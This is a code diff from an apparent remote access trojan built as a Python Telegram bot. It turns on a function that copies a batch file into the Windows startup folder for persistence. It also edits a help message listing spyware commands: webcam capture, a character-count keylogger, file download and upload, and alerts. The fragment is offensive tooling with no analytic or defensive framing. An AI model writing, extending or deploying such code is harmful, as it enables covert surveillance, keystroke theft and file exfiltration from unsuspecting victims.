@@ -36,7 +36,7 @@ def Startup():
         sleep(2)
         shutil.copy(os.getcwd()+ r'\run.bat', startupPath)
         
-# Startup()
+Startup()
 @bot.message_handler(commands=['Help'])
 def help(msg):
     helpMsg = '''
@@ -49,9 +49,9 @@ def help(msg):
     /ip 
     /buzzer <time(m)>
     /webcam <time(s)> --> Send Video From Webcam
-    /keyCountBase <chatCount> --> key loger based count of chars 
+    /keyCountBase <charCount> --> key loger based count of chars 
     /download <file_path>
-    /upload <>
+    /upload <directory>
     /mkdir <directory> <folder_name>
     /alert <msg>
     '''
